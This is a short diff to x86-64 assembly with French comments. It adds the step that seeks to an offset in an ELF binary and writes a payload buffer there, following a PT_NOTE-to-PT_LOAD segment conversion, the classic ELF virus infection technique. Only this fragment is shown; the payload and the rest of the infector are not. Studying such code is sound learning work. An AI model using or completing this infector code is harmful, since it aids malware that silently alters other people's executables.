@@ -278,6 +278,20 @@ preparation_PT_LOAD:
 	mov rdx, 56
 	syscall				; Remplacer PT_NOTE par PT_LOAD
 
+	
+	mov rax, 8 			; Aller à l'emplacement du payload
+	mov rdi, r8
+	mov rsi, [new_p_offset]
+	mov rdx, 0
+	syscall				; SEEK_SET vers new_p_offset
+
+	; Écrire le payload dans simple
+	mov rax, 1
+	mov rdi, r8
+	mov rsi, payload_buffer
+	mov rdx, [payload_size]
+	syscall				; Écrire le payload
+
 	mov rax, 3
 	mov rdi, r8
 	syscall				; Fermer le fichier
